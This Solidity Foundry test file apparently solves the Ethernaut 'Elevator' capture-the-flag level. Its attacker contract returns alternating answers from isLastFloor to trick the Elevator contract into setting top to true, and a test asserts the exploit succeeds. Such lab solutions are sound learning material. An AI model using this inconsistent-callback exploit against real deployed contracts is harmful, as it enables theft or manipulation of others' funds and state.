// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Test.sol";
import "../src/Elevator.sol";

contract Attack is Building{
    Elevator public elevator;
    uint public value;
    constructor(address elevatoraddress) {
        elevator = Elevator(elevatoraddress);
        value = 0;
    }

    function isLastFloor(uint _floor) external returns (bool){
        ++value;
        if(value%2==0){
            return true;
        }
        else {
            return false;
        }
    }

    function attack() public {
        elevator.goTo(11);
    }
}
contract ElevatorTest is Test {
    Elevator public elevatorContract;
    address public attacker;
    function setUp() public {
        attacker = vm.addr(1);
        elevatorContract = new Elevator();  
    }
    function testExploit() public {
        vm.startPrank(attacker);
        Attack attack = new Attack(address(elevatorContract));
        attack.attack();
        // elevatorContract.goTo(10);
        vm.stopPrank();

        assertEq(elevatorContract.top(), true);
    }
}